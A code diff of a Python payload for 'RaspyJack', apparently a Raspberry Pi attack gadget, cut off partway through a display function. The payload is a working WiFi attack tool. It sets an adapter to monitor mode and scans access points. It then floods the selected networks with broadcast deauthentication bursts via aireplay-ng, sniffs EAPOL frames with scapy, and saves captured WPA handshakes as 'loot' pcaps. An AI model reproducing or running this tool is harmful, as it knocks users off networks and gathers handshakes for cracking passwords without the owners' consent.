@@ -1,61 +1,96 @@
 #!/usr/bin/env python3
 """
-RaspyJack WiFi Deauth - Multi-Target Version
-=================================================
-Clear button layout for multi-target attacks:
+RaspyJack WiFi Deauth -- Multi-Target with Handshake Capture
+=============================================================
+Author: 7h30th3r0n3
 
-MAIN MENU:
-- KEY1: Scan networks
-- LEFT: Adjust scan timeout  
-- RIGHT: Change attack mode
-- KEY3: Exit
+States: idle > scanning > select > attacking
 
-NETWORK SELECTION (after scan):
-- UP/DOWN: Navigate networks
-- OK: Toggle network selection (add/remove from targets)
-- RIGHT: Start attack (single or multi-target)
-- KEY1: Rescan
-- KEY2: Clear all selections
-- KEY3: Back to main menu
+Controls:
+  IDLE:        OK=Scan  KEY3=Exit
+  SCANNING:    KEY3=Cancel
+  SELECT:      OK=Toggle  UP/DN=Nav  K1=Rescan  K2=Attack  LEFT/RIGHT=Mode  KEY3=Back
+  ATTACKING:   KEY2=Stop  KEY3=Exit
 
-DURING ATTACK:
-- KEY2: Stop all attacks
-- KEY3: Exit
+Modes:
+  DTH       -- Deauth only (aireplay-ng bursts)
+  DTH+CAP   -- Deauth + parallel EAPOL sniffer (scapy)
+
+Handshakes saved to /root/Raspyjack/loot/Handshakes/
 """
 
-import os, sys, time, signal, subprocess, threading
-sys.path.append(os.path.abspath(os.path.join(__file__, '..', '..', '..')))
+import os
+import sys
+import time
+import signal
+import subprocess
+import threading
+
+sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))
 
 import RPi.GPIO as GPIO
-import LCD_1in44, LCD_Config
-from PIL import Image, ImageDraw, ImageFont
+import LCD_1in44
+import LCD_Config
+from PIL import Image, ImageFont
 from payloads._display_helper import ScaledDraw, scaled_font
-
-# Shared input helper (WebUI virtual + GPIO)
 from payloads._input_helper import get_button
 from payloads._iface_helper import select_interface
 
-# WiFi Integration - Import dynamic interface support
+# Optional scapy for handshake capture mode
 try:
-    sys.path.append('/root/Raspyjack/wifi/')
+    from scapy.all import (
+        Dot11, Dot11Deauth, RadioTap, EAPOL,
+        sendp, sniff as scapy_sniff, wrpcap, conf,
+    )
+    SCAPY_OK = True
+except ImportError:
+    SCAPY_OK = False
+
+# WiFi integration (optional)
+try:
+    sys.path.append("/root/Raspyjack/wifi/")
     from wifi.raspyjack_integration import (
         get_best_interface,
         get_available_interfaces,
         get_interface_status,
-        set_raspyjack_interface
+        set_raspyjack_interface,
     )
     WIFI_INTEGRATION = True
-    print("WiFi integration loaded - dynamic interface support enabled")
-except ImportError as e:
-    print(f"WiFi integration not available: {e}")
+except ImportError:
     WIFI_INTEGRATION = False
 
-# Configuration
-PINS = {"UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26, "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16}
-SCAN_TIMEOUT = 15
+# ---------------------------------------------------------------------------
+# Constants
+# ---------------------------------------------------------------------------
+PINS = {
+    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
+    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
+}
+SCAN_TIMEOUT_DEFAULT = 15
 LOG_FILE = os.path.join(os.path.dirname(__file__), "deauth_debug.log")
+LOOT_DIR = "/root/Raspyjack/loot/Handshakes"
 
-# Reserve the onboard Pi WiFi for WebUI, regardless of whether it is wlan0 or wlan1
+# Attack modes
+MODE_DEAUTH = 0
+MODE_DEAUTH_CAPTURE = 1
+MODE_LABELS = ["DTH", "DTH+CAP"]
+
+# Colors (base-128 drawing)
+CLR_GREEN = "#00FF00"
+CLR_RED = "#FF3333"
+CLR_YELLOW = "#FFCC00"
+CLR_CYAN = "#00CCFF"
+CLR_WHITE = "#FFFFFF"
+CLR_GRAY = "#888888"
+CLR_DARK = "#111111"
+CLR_BG_IDLE = "#333300"
+CLR_BG_SCAN = "#003300"
+CLR_BG_ATK = "#330000"
+
+# ---------------------------------------------------------------------------
+# Onboard WiFi detection (keep WebUI alive)
+# ---------------------------------------------------------------------------
+
 def _is_onboard_wifi_iface(iface):
     """True for onboard Pi WiFi (SDIO/mmc path or brcmfmac driver)."""
     try:
@@ -92,86 +127,409 @@ def _detect_webui_interface():
 
 WEBUI_INTERFACE = _detect_webui_interface()
 
+# ---------------------------------------------------------------------------
+# Logging
+# ---------------------------------------------------------------------------
+
 def log(message):
-    """Write message to log file."""
-    timestamp = time.strftime("%H:%M:%S")
+    """Append timestamped message to log file."""
+    ts = time.strftime("%H:%M:%S")
     try:
-        with open(LOG_FILE, 'a') as f:
-            f.write(f"[{timestamp}] {message}\n")
-            f.flush()
-    except:
+        with open(LOG_FILE, "a") as f:
+            f.write(f"[{ts}] {message}\n")
+    except Exception:
         pass
 
-# Dynamic WiFi interface selection
-def get_wifi_interface():
-    """Get the best WiFi interface for deauth attacks.
-    
-    IMPORTANT: onboard WiFi (WebUI interface) is never used for monitor mode.
-    """
+# ---------------------------------------------------------------------------
+# Legacy interface fallback
+# ---------------------------------------------------------------------------
+
+def _get_wifi_interface_fallback():
+    """Return best WiFi interface when select_interface returns None."""
     if WIFI_INTEGRATION:
-        # Use WiFi integration to get best interface, preferring WiFi dongles
-        interfaces = get_available_interfaces()
-        # Exclude onboard/WebUI interface
-        wifi_interfaces = [iface for iface in interfaces
-                           if iface.startswith('wlan') and iface != WEBUI_INTERFACE]
-        
-        if wifi_interfaces:
-            wifi_interfaces.sort(key=lambda x: (int(x[4:]) if x[4:].isdigit() else 999, x))
-            selected_interface = wifi_interfaces[0]
-            
-            # Check interface status
-            status = get_interface_status(selected_interface)
-            if status["connected"]:
-                try:
-                    log(f"Using connected WiFi interface: {selected_interface}")
-                except:
-                    print(f"Using connected WiFi interface: {selected_interface}")
-                return selected_interface
-            else:
-                try:
-                    log(f"Selected interface {selected_interface} not connected, but proceeding anyway")
-                except:
-                    print(f"Selected interface {selected_interface} not connected, but proceeding anyway")
-                return selected_interface
-        else:
-            try:
-                log(f"No WiFi interfaces found via integration ({WEBUI_INTERFACE} reserved for WebUI)")
-            except:
-                print(f"No WiFi interfaces found via integration ({WEBUI_INTERFACE} reserved for WebUI)")
-            return "wlan1"  # Fallback
-    else:
-        # Fallback to hardcoded interface
         try:
-            log("Using fallback interface: wlan1")
-        except:
-            print("Using fallback interface: wlan1")
-        return "wlan1"
+            interfaces = get_available_interfaces()
+            candidates = [
+                i for i in interfaces
+                if i.startswith("wlan") and i != WEBUI_INTERFACE
+            ]
+            if candidates:
+                candidates.sort(key=lambda x: (int(x[4:]) if x[4:].isdigit() else 999, x))
+                return candidates[0]
+        except Exception:
+            pass
+    return "wlan1"
 
-# WiFi interface -- resolved after LCD init via select_interface()
-WIFI_INTERFACE = None
+# ---------------------------------------------------------------------------
+# Shell helpers
+# ---------------------------------------------------------------------------
 
-# Interface validation patterns
-INTERFACE_PATTERNS = ["wlan0", "wlan1", "wlan2", "wlan0mon", "wlan1mon", "wlan2mon"]
+def run_command(cmd, timeout=None):
+    """Run shell command, return combined stdout+stderr."""
+    try:
+        proc = subprocess.Popen(
+            cmd, shell=True,
+            stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+            preexec_fn=os.setsid,
+        )
+        stdout, stderr = proc.communicate(timeout=timeout)
+        return stdout.decode("utf-8", errors="replace") + stderr.decode("utf-8", errors="replace")
+    except Exception:
+        return "Error"
 
-# Global state
-running = True
-current_attack_process = None
-networks = []
-selected_index = 0
-selected_targets = []
-attack_processes = []
-current_screen = "main"  # main, networks, attacking
+# ---------------------------------------------------------------------------
+# Monitor mode setup / teardown (preserved from original)
+# ---------------------------------------------------------------------------
 
-# Thread control
-attack_stop_event = threading.Event()
-attack_threads = []
+def check_interface_exists(iface):
+    """Return True if the WiFi interface exists, trying alternatives."""
+    result = run_command(f"iwconfig {iface}")
+    if "No such device" not in result and "IEEE 802.11" in result:
+        return True
+    # Try alternatives
+    patterns = ["wlan0", "wlan1", "wlan2", "wlan0mon", "wlan1mon", "wlan2mon"]
+    for alt in patterns:
+        if alt == WEBUI_INTERFACE or alt == f"{WEBUI_INTERFACE}mon":
+            continue
+        r = run_command(f"iwconfig {alt}")
+        if "No such device" not in r and "IEEE 802.11" in r:
+            return True
+    return False
 
-# UI state for improved display
-attack_start_time = 0
-deauth_packet_count = 0
-discovered_clients = 0
 
-# GPIO and LCD setup
+def setup_monitor_mode(iface):
+    """Enable monitor mode on *iface*. Returns (success, mon_iface_name)."""
+    log(f"Setting up monitor mode on {iface}")
+
+    # Reject onboard WiFi
+    driver_check = run_command(f"ethtool -i {iface} 2>/dev/null || echo unknown")
+    if "brcmfmac" in driver_check:
+        log("Onboard Broadcom WiFi -- no monitor mode support")
+        return False, iface
+
+    # Unmanage from NetworkManager, kill wpa_supplicant for this iface only
+    run_command(f"nmcli device set {iface} managed no")
+    run_command(f"pkill -f 'wpa_supplicant.*{iface}'")
+    time.sleep(1)
+
+    # Already in monitor?
+    iwc = run_command(f"iwconfig {iface}")
+    if "Mode:Monitor" in iwc:
+        log(f"{iface} already in monitor mode")
+        return True, iface
+
+    # Method 1: airmon-ng
+    log("Trying airmon-ng")
+    run_command(f"airmon-ng start {iface}")
+    for candidate in [f"{iface}mon", iface]:
+        chk = run_command(f"iwconfig {candidate}")
+        if "Mode:Monitor" in chk:
+            log(f"Monitor mode on {candidate} via airmon-ng")
+            return True, candidate
+
+    # Method 2: manual iwconfig
+    log("Trying manual iwconfig")
+    run_command(f"ifconfig {iface} down")
+    time.sleep(0.5)
+    run_command(f"iwconfig {iface} mode monitor")
+    time.sleep(0.5)
+    run_command(f"ifconfig {iface} up")
+    time.sleep(1)
+    chk = run_command(f"iwconfig {iface}")
+    if "Mode:Monitor" in chk:
+        log(f"Monitor mode on {iface} via iwconfig")
+        return True, iface
+
+    log("Failed to enable monitor mode")
+    return False, iface
+
+
+def validate_setup(iface):
+    """Full pre-flight: interface exists, tools present, monitor mode."""
+    if not check_interface_exists(iface):
+        draw_status(f"{iface} not found!", CLR_RED)
+        time.sleep(2)
+        return False, iface
+
+    for tool in ("aireplay-ng", "airodump-ng"):
+        if tool not in run_command(f"which {tool}"):
+            draw_status(f"Missing: {tool}", CLR_RED)
+            time.sleep(2)
+            return False, iface
+
+    # Check if onboard (no monitor mode)
+    driver = run_command(f"ethtool -i {iface} 2>/dev/null || echo unknown")
+    if "brcmfmac" in driver:
+        draw_status(f"{iface} = onboard WiFi\nNo monitor mode!\nUse USB dongle", CLR_RED)
+        time.sleep(3)
+        return False, iface
+
+    draw_status(f"Monitor mode: {iface}...")
+    ok, mon = setup_monitor_mode(iface)
+    if not ok:
+        draw_status(f"Monitor mode failed\non {iface}", CLR_RED)
+        time.sleep(2)
+    return ok, mon
+
+# ---------------------------------------------------------------------------
+# Scanning
+# ---------------------------------------------------------------------------
+
+def scan_networks(iface, timeout_sec):
+    """Run airodump-ng and parse CSV. Returns list of network dicts."""
+    log(f"Scanning on {iface}, timeout {timeout_sec}s")
+    subprocess.run("rm -f /tmp/deauth_scan*", shell=True)
+    cmd = (
+        f"timeout {timeout_sec} airodump-ng --band abg "
+        f"--output-format csv -w /tmp/deauth_scan {iface}"
+    )
+    subprocess.run(cmd, shell=True, capture_output=True, text=True)
+
+    nets = []
+    clients_per_bssid = {}
+
+    try:
+        with open("/tmp/deauth_scan-01.csv", "r") as f:
+            content = f.read()
+    except Exception as exc:
+        log(f"Cannot read scan CSV: {exc}")
+        return nets
+
+    # Split AP section from Station section
+    parts = content.split("Station MAC")
+    ap_section = parts[0]
+    station_section = parts[1] if len(parts) > 1 else ""
+
+    # Count clients per BSSID from station section
+    for line in station_section.strip().split("\n"):
+        cols = line.split(",")
+        if len(cols) >= 6:
+            bssid = cols[5].strip() if len(cols) > 5 else ""
+            if ":" in bssid:
+                clients_per_bssid[bssid] = clients_per_bssid.get(bssid, 0) + 1
+
+    # Parse AP section
+    header_found = False
+    col_map = {}
+    for line in ap_section.strip().split("\n"):
+        if "BSSID" in line and "ESSID" in line:
+            headers = [h.strip() for h in line.split(",")]
+            for i, h in enumerate(headers):
+                col_map[h.upper()] = i
+            header_found = True
+            continue
+        if not header_found:
+            continue
+
+        cols = line.split(",")
+        bssid_i = col_map.get("BSSID", -1)
+        essid_i = col_map.get("ESSID", -1)
+        ch_i = col_map.get("CHANNEL", -1)
+        pwr_i = col_map.get("POWER", -1)
+
+        if bssid_i < 0 or essid_i < 0:
+            continue
+        if len(cols) <= max(bssid_i, essid_i):
+            continue
+
+        bssid = cols[bssid_i].strip()
+        essid = cols[essid_i].strip().strip('"')
+        channel = cols[ch_i].strip() if ch_i >= 0 and ch_i < len(cols) else "?"
+        power_raw = cols[pwr_i].strip() if pwr_i >= 0 and pwr_i < len(cols) else "-99"
+
+        if not essid or not bssid or ":" not in bssid:
+            continue
+
+        # Parse power to int
+        try:
+            power = int(power_raw)
+        except ValueError:
+            power = -99
+
+        num_clients = clients_per_bssid.get(bssid, 0)
+
+        nets.append({
+            "essid": essid,
+            "bssid": bssid,
+            "channel": channel,
+            "power": power,
+            "clients": num_clients,
+        })
+
+    # Sort by signal strength (strongest first)
+    nets.sort(key=lambda n: n["power"], reverse=True)
+    log(f"Found {len(nets)} networks")
+    return nets
+
+# ---------------------------------------------------------------------------
+# Signal strength helpers
+# ---------------------------------------------------------------------------
+
+def _signal_bars(power_dbm):
+    """Return 1-4 bar string based on dBm value."""
+    if power_dbm >= -50:
+        return "||||"
+    if power_dbm >= -60:
+        return "||| "
+    if power_dbm >= -70:
+        return "||  "
+    if power_dbm >= -80:
+        return "|   "
+    return ".   "
+
+
+def _signal_color(power_dbm):
+    """Return color for signal strength."""
+    if power_dbm >= -50:
+        return CLR_GREEN
+    if power_dbm >= -65:
+        return CLR_YELLOW
+    return CLR_RED
+
+# ---------------------------------------------------------------------------
+# Attack logic (preserved from original)
+# ---------------------------------------------------------------------------
+
+def start_attack_worker(targets, iface, stop_event, stats):
+    """Worker thread: aggressive triple deauth on all targets.
+
+    *stats* is a dict mutated in-place: {packets, clients, eapol, hs_captured, hs_ssid}.
+    """
+    log(f"Attack worker started, {len(targets)} targets")
+
+    while not stop_event.is_set():
+        for target in targets:
+            if stop_event.is_set():
+                break
+            ch = target["channel"]
+            if ch == "?" or not ch.strip().isdigit():
+                continue
+
+            # Set channel
+            run_command(f"iwconfig {iface} channel {ch}")
+            time.sleep(0.5)
+            if stop_event.is_set():
+                break
+
+            bssid = target["bssid"]
+
+            # Attack 1: 10s continuous broadcast deauth
+            if not stop_event.is_set():
+                cmd = f"timeout 10 aireplay-ng -0 0 -a {bssid} -c FF:FF:FF:FF:FF:FF {iface}"
+                result = run_command(cmd)
+                if "Sending" in result and "DeAuth" in result:
+                    stats["packets"] += 200
+                else:
+                    stats["packets"] += 100
+
+            # Attack 2-4: three 64-packet bursts
+            for burst in range(3):
+                if stop_event.is_set():
+                    break
+                cmd = f"aireplay-ng -0 64 -a {bssid} -c FF:FF:FF:FF:FF:FF {iface}"
+                run_command(cmd)
+                stats["packets"] += 64
+                time.sleep(0.3)
+
+            if stop_event.is_set():
+                break
+
+            # Brief pause between targets
+            if stop_event.wait(1):
+                break
+
+        # Pause between cycles
+        if stop_event.wait(3):
+            break
+
+    log("Attack worker stopped")
+
+
+def start_capture_worker(targets, iface, stop_event, stats):
+    """Worker thread: sniff EAPOL frames in parallel with deauth.
+
+    When 4+ EAPOL messages captured for a MAC pair, save pcap.
+    Mutates *stats* in-place.
+    """
+    if not SCAPY_OK:
+        log("Scapy not available -- capture worker disabled")
+        return
+
+    eapol_msgs = {}  # (mac_a, mac_b) -> [pkt, ...]
+
+    def _handle(pkt):
+        if stop_event.is_set():
+            return
+        if not pkt.haslayer(EAPOL):
+            return
+        stats["eapol"] += 1
+        src = (pkt[Dot11].addr2 or "").upper() if pkt.haslayer(Dot11) else ""
+        dst = (pkt[Dot11].addr1 or "").upper() if pkt.haslayer(Dot11) else ""
+        pair = tuple(sorted([src, dst]))
+        if pair not in eapol_msgs:
+            eapol_msgs[pair] = []
+        eapol_msgs[pair].append(pkt)
+
+        # Check for complete handshake
+        if len(eapol_msgs[pair]) >= 4 and not stats.get("_saved_" + str(pair)):
+            stats["_saved_" + str(pair)] = True
+            stats["hs_captured"] += 1
+            # Determine SSID from targets
+            for t in targets:
+                if t["bssid"].upper() in pair:
+                    stats["hs_ssid"] = t["essid"]
+                    break
+            # Save pcap
+            _save_handshake(eapol_msgs[pair], stats.get("hs_ssid", "unknown"))
+
+    def _sniff_loop():
+        while not stop_event.is_set():
+            try:
+                scapy_sniff(
+                    iface=iface, prn=_handle, timeout=10, store=False,
+                    stop_filter=lambda _: stop_event.is_set(),
+                )
+            except Exception as exc:
+                log(f"Sniffer error: {exc}")
+                if not stop_event.is_set():
+                    time.sleep(1)
+
+    sniff_t = threading.Thread(target=_sniff_loop, daemon=True)
+    sniff_t.start()
+    log("Capture worker started")
+
+
+def _save_handshake(packets, essid):
+    """Write EAPOL packets to a .pcap in loot directory."""
+    os.makedirs(LOOT_DIR, exist_ok=True)
+    safe = "".join(c if c.isalnum() or c in "-_" else "_" for c in essid)
+    ts = time.strftime("%Y%m%d_%H%M%S")
+    path = os.path.join(LOOT_DIR, f"hs_{safe}_{ts}.pcap")
+    try:
+        wrpcap(path, packets)
+        log(f"Handshake saved: {path}")
+    except Exception as exc:
+        log(f"Failed to save handshake: {exc}")
+
+# ---------------------------------------------------------------------------
+# Cleanup
+# ---------------------------------------------------------------------------
+
+def stop_all(stop_event, threads, iface):
+    """Signal stop, kill leftover processes, wait for threads."""
+    stop_event.set()
+    run_command("pkill -f aireplay-ng 2>/dev/null || true")
+    run_command("pkill -f airodump-ng 2>/dev/null || true")
+    for t in threads:
+        if t.is_alive():
+            t.join(timeout=3)
+    run_command(f"nmcli device set {iface} managed yes 2>/dev/null || true")
+    log("Cleanup done")
+
+# ---------------------------------------------------------------------------
+# LCD setup
+# ---------------------------------------------------------------------------
+
 GPIO.setmode(GPIO.BCM)
 for pin in PINS.values():
     GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)
@@ -179,1089 +537,576 @@ for pin in PINS.values():
 LCD = LCD_1in44.LCD()
 LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
 WIDTH, HEIGHT = LCD.width, LCD.height
-font_large = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", int(10 * LCD_1in44.LCD_SCALE))
+
 canvas = Image.new("RGB", (WIDTH, HEIGHT), "black")
 draw = ScaledDraw(canvas)
 
-# Fonts for improved UI (all sizes in 128-base)
-font_title = scaled_font(9)
-font_body = scaled_font(8)
-font_small = scaled_font(7)
+# Fonts (base-128 sizes)
+FNT_LG = scaled_font(10)
+FNT_MD = scaled_font(9)
+FNT_SM = scaled_font(8)
+FNT_XS = scaled_font(7)
 
-# Color palette
-COLOR_GREEN = "#00FF00"
-COLOR_RED = "#FF3333"
-COLOR_YELLOW = "#FFCC00"
-COLOR_WHITE = "#FFFFFF"
-COLOR_GRAY = "#888888"
-COLOR_DARK_BG = "#111111"
-COLOR_HEADER_IDLE = "#333300"
-COLOR_HEADER_SCAN = "#003300"
-COLOR_HEADER_ATTACK = "#330000"
+# ---------------------------------------------------------------------------
+# Interface selection
+# ---------------------------------------------------------------------------
 
+WIFI_INTERFACE = select_interface(LCD, scaled_font(), PINS, GPIO, iface_type="wifi")
+if not WIFI_INTERFACE:
+    WIFI_INTERFACE = _get_wifi_interface_fallback()
 
-def _draw_header(status_text, color, bg_color):
-    """Draw a colored status header bar at the top of the screen."""
-    draw.rectangle((0, 0, 128, 12), fill=bg_color)
+# ---------------------------------------------------------------------------
+# Drawing helpers
+# ---------------------------------------------------------------------------
+
+def _header(text, color, bg):
+    """Colored header bar at top."""
+    draw.rectangle((0, 0, 128, 12), fill=bg)
     draw.line((0, 12, 128, 12), fill=color)
-    w = draw.textbbox((0, 0), status_text, font=font_title)[2]
+    w = draw.textbbox((0, 0), text, font=FNT_MD)[2]
     x = (128 - w) // 2
-    draw.text((x, 1), status_text, font=font_title, fill=color)
+    draw.text((x, 1), text, font=FNT_MD, fill=color)
 
 
-def _draw_footer(controls):
-    """Draw a footer area with control hints."""
-    footer_y = 114
-    draw.rectangle((0, footer_y, 128, 128), fill=COLOR_DARK_BG)
-    draw.line((0, footer_y, 128, footer_y), fill=COLOR_GRAY)
-    draw.text((2, footer_y + 2), controls, font=font_small, fill=COLOR_GRAY)
+def _footer(text):
+    """Gray footer bar at bottom."""
+    draw.rectangle((0, 114, 128, 128), fill=CLR_DARK)
+    draw.line((0, 114, 128, 114), fill=CLR_GRAY)
+    draw.text((2, 115), text, font=FNT_XS, fill=CLR_GRAY)
 
 
-def _format_elapsed(seconds):
-    """Format elapsed seconds as MM:SS."""
+def _fmt_time(seconds):
     m = int(seconds) // 60
     s = int(seconds) % 60
     return f"{m:02d}:{s:02d}"
 
 
-def draw_main_menu(page):
-    """Draw the main menu with IDLE status header."""
+def _refresh():
+    LCD.LCD_ShowImage(canvas, 0, 0)
+
+# ---------------------------------------------------------------------------
+# Screen: IDLE
+# ---------------------------------------------------------------------------
+
+def draw_idle(iface, timeout, mode):
     draw.rectangle((0, 0, 128, 128), fill="black")
-    _draw_header("IDLE", COLOR_YELLOW, COLOR_HEADER_IDLE)
+    _header("IDLE", CLR_YELLOW, CLR_BG_IDLE)
+    draw.text((4, 16), f"Iface: {iface[:12]}", font=FNT_SM, fill=CLR_WHITE)
+    draw.text((4, 26), f"Timeout: {timeout}s", font=FNT_SM, fill=CLR_WHITE)
+    draw.text((4, 36), f"Mode: {MODE_LABELS[mode]}", font=FNT_SM, fill=CLR_CYAN)
+    if mode == MODE_DEAUTH_CAPTURE and not SCAPY_OK:
+        draw.text((4, 46), "scapy missing!", font=FNT_XS, fill=CLR_RED)
+    draw.text((4, 60), "OK     Scan networks", font=FNT_XS, fill=CLR_GREEN)
+    draw.text((4, 70), "L/R    Switch mode", font=FNT_XS, fill=CLR_WHITE)
+    draw.text((4, 80), "UP/DN  Timeout +/-5s", font=FNT_XS, fill=CLR_WHITE)
+    draw.text((4, 90), "KEY3   Exit", font=FNT_XS, fill=CLR_RED)
+    _footer(f"{MODE_LABELS[mode]}  {iface}")
+    _refresh()
 
-    draw.text((4, 16), f"Iface: {WIFI_INTERFACE[:10]}", font=font_body, fill=COLOR_WHITE)
-    draw.text((4, 27), f"Timeout: {SCAN_TIMEOUT}s", font=font_body, fill=COLOR_WHITE)
+# ---------------------------------------------------------------------------
+# Screen: SCANNING (animated)
+# ---------------------------------------------------------------------------
 
-    if page == 0:
-        draw.text((4, 42), "KEY1  Scan networks", font=font_small, fill=COLOR_GREEN)
-        draw.text((4, 52), "LEFT  Adjust timeout", font=font_small, fill=COLOR_WHITE)
-        draw.text((4, 62), "KEY2  Switch iface", font=font_small, fill=COLOR_WHITE)
-        draw.text((4, 72), "KEY3  Exit", font=font_small, fill=COLOR_RED)
-    elif page == 1:
-        draw.text((4, 42), "KEY1  Scan networks", font=font_small, fill=COLOR_GREEN)
-        draw.text((4, 52), "LEFT  Adjust timeout", font=font_small, fill=COLOR_WHITE)
-        draw.text((4, 62), "KEY2  Switch iface", font=font_small, fill=COLOR_WHITE)
-        draw.text((4, 72), "KEY3  Exit", font=font_small, fill=COLOR_RED)
+def draw_scanning(elapsed, timeout):
+    dots = "." * (int(elapsed * 2) % 4)
+    draw.rectangle((0, 0, 128, 128), fill="black")
+    _header("SCANNING", CLR_GREEN, CLR_BG_SCAN)
+    draw.text((20, 40), f"Scanning{dots}", font=FNT_MD, fill=CLR_GREEN)
+    remaining = max(0, timeout - int(elapsed))
+    draw.text((30, 58), f"{remaining}s remaining", font=FNT_SM, fill=CLR_GRAY)
+    # Progress bar
+    pct = min(1.0, elapsed / timeout) if timeout > 0 else 0
+    bar_w = int(100 * pct)
+    draw.rectangle((14, 78, 114, 84), outline=CLR_GRAY)
+    if bar_w > 0:
+        draw.rectangle((14, 78, 14 + bar_w, 84), fill=CLR_GREEN)
+    _footer("KEY3: Cancel")
+    _refresh()
+
+# ---------------------------------------------------------------------------
+# Screen: SELECT (network list)
+# ---------------------------------------------------------------------------
+
+def draw_select(nets, idx, targets, mode):
+    target_bssids = {t["bssid"] for t in targets}
+    draw.rectangle((0, 0, 128, 128), fill="black")
+    _header(f"SELECT  {len(nets)} APs", CLR_GREEN, CLR_BG_SCAN)
+
+    # Visible window: 7 rows, 10px each, starting at y=15
+    rows = 7
+    row_h = 13
+    scroll = max(0, idx - rows // 2)
+    scroll = min(scroll, max(0, len(nets) - rows))
+
+    for i in range(rows):
+        ni = scroll + i
+        if ni >= len(nets):
+            break
+        net = nets[ni]
+        y = 15 + i * row_h
+        is_cur = ni == idx
+        is_sel = net["bssid"] in target_bssids
+
+        # Checkbox
+        chk = "[x]" if is_sel else "[ ]"
+        chk_clr = CLR_GREEN if is_sel else CLR_GRAY
+
+        # Highlight current row
+        if is_cur:
+            draw.rectangle((0, y - 1, 128, y + row_h - 2), fill="#1a1a2e")
+
+        # Checkbox
+        draw.text((1, y), chk, font=FNT_XS, fill=chk_clr)
+
+        # SSID (truncated)
+        ssid = net["essid"][:10]
+        name_clr = CLR_WHITE if is_cur else CLR_GRAY
+        draw.text((18, y), ssid, font=FNT_XS, fill=name_clr)
+
+        # Channel
+        ch = net["channel"]
+        draw.text((80, y), f"c{ch}", font=FNT_XS, fill=CLR_CYAN)
+
+        # Signal bars
+        bars = _signal_bars(net["power"])
+        bar_clr = _signal_color(net["power"])
+        draw.text((96, y), bars, font=FNT_XS, fill=bar_clr)
+
+        # Client count (tiny, rightmost)
+        if net["clients"] > 0:
+            draw.text((120, y), str(net["clients"]), font=FNT_XS, fill=CLR_YELLOW)
+
+    # Info bar above footer
+    draw.line((0, 108, 128, 108), fill=CLR_GRAY)
+    draw.text((2, 109), f"{len(targets)} sel  {MODE_LABELS[mode]}", font=FNT_XS, fill=CLR_YELLOW)
+    draw.text((80, 109), f"{idx + 1}/{len(nets)}", font=FNT_XS, fill=CLR_GRAY)
+
+    _footer("OK:Sel UP/DN K1:Scan K2:Go K3:Bk")
+    _refresh()
+
+# ---------------------------------------------------------------------------
+# Screen: ATTACKING (dashboard)
+# ---------------------------------------------------------------------------
+
+def draw_attack_dashboard(targets, stats, elapsed, mode, hs_flash_until):
+    draw.rectangle((0, 0, 128, 128), fill="black")
+
+    # Flash green border on handshake capture
+    now = time.time()
+    if hs_flash_until > now:
+        draw.rectangle((0, 0, 127, 127), outline=CLR_GREEN)
+        draw.rectangle((1, 1, 126, 126), outline=CLR_GREEN)
+
+    _header("ATTACKING", CLR_RED, CLR_BG_ATK)
+
+    # Target SSIDs (top area)
+    if len(targets) == 1:
+        ssid = targets[0]["essid"][:16]
+        draw.text((4, 15), ssid, font=FNT_SM, fill=CLR_RED)
+        # Signal for single target
+        bars = _signal_bars(targets[0].get("power", -99))
+        draw.text((100, 15), bars, font=FNT_XS, fill=_signal_color(targets[0].get("power", -99)))
     else:
-        draw.text((4, 42), "KEY3  Exit", font=font_small, fill=COLOR_RED)
+        draw.text((4, 15), f"{len(targets)} targets", font=FNT_SM, fill=CLR_RED)
 
-    _draw_footer(f"UP/DN: Page {page + 1}/3")
-    LCD.LCD_ShowImage(canvas, 0, 0)
+    # Mode indicator + elapsed
+    draw.text((4, 26), MODE_LABELS[mode], font=FNT_XS, fill=CLR_CYAN)
+    draw.text((90, 26), _fmt_time(elapsed), font=FNT_SM, fill=CLR_WHITE)
 
+    draw.line((4, 35, 124, 35), fill=CLR_RED)
 
-def draw_network_list(nets, idx, targets):
-    """Draw the network selection screen with SCANNING status."""
+    # Packet counter (big)
+    draw.text((4, 38), "Deauth Pkts:", font=FNT_XS, fill=CLR_GRAY)
+    pkt_str = str(stats["packets"])
+    draw.text((4, 48), pkt_str, font=FNT_LG, fill=CLR_RED)
+
+    # Clients
+    draw.text((4, 63), f"Clients: {stats['clients']}", font=FNT_XS, fill=CLR_YELLOW)
+
+    # Capture mode stats
+    if mode == MODE_DEAUTH_CAPTURE:
+        draw.line((4, 74, 124, 74), fill=CLR_GRAY)
+        draw.text((4, 76), f"EAPOL: {stats['eapol']}", font=FNT_XS, fill=CLR_CYAN)
+        draw.text((70, 76), f"HS: {stats['hs_captured']}", font=FNT_XS, fill=CLR_GREEN)
+        if hs_flash_until > now:
+            draw.text((20, 88), "HS CAPTURED!", font=FNT_MD, fill=CLR_GREEN)
+        elif stats["hs_captured"] > 0:
+            ssid = stats.get("hs_ssid", "")[:14]
+            draw.text((4, 88), f"Last: {ssid}", font=FNT_XS, fill=CLR_GREEN)
+
+    # Target list (compact)
+    list_y = 98 if mode == MODE_DEAUTH_CAPTURE else 76
+    draw.line((4, list_y - 2, 124, list_y - 2), fill=CLR_GRAY)
+    for t in targets[:3]:
+        name = t["essid"][:14]
+        draw.text((6, list_y), f"Ch{t['channel']:>3} {name}", font=FNT_XS, fill=CLR_RED)
+        list_y += 9
+    if len(targets) > 3:
+        draw.text((6, list_y), f"+{len(targets) - 3} more", font=FNT_XS, fill=CLR_GRAY)
+
+    _footer("KEY2:Stop  KEY3:Exit")
+    _refresh()
+
+# ---------------------------------------------------------------------------
+# Screen: Setup status
+# ---------------------------------------------------------------------------
+
+def draw_status(msg, color=CLR_GREEN):
     draw.rectangle((0, 0, 128, 128), fill="black")
-    _draw_header(f"SCAN  {len(nets)} found", COLOR_GREEN, COLOR_HEADER_SCAN)
-
-    # Current network info
-    net = nets[idx]
-    is_sel = net['bssid'] in [t['bssid'] for t in targets]
-    marker = "[*]" if is_sel else "[ ]"
-
-    # Network name (prominent)
-    draw.text((4, 15), f"{marker} {net['essid'][:14]}", font=font_title, fill=COLOR_GREEN if is_sel else COLOR_WHITE)
-
-    # Network details
